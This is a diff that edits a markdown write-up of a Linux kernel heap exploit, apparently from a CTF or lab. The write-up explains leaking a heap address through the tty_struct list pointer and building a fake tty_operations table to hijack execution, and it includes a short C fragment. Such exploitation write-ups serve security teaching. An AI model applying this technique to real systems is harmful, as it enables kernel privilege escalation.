@@ -269,7 +269,7 @@ struct tty_struct {
 ...
 ~~~
 
-`->next` pointer, points to the tty_struct:
+`->next` pointer, points to the tty_struct (points to itself):
 
 ~~~
 struct list_head *next: `g_buf` + 0x400 + 0x38 = 0xffff888002fc5038
@@ -284,7 +284,8 @@ g_buf: 0xffff888002fc5038 - 0x438 = 0xffff888002fc4c00
 
 ## Obtaining RIP
 
-Creates a fake `tty_struct` at `g_buf`:
+Creates a fake `struct tty_operations` at `g_buf`, and points `->ops` of the victim tty_struct to it:
+
 ~~~c
   // write fake function table
   unsigned  long *p = (unsigned  long *)&buf;
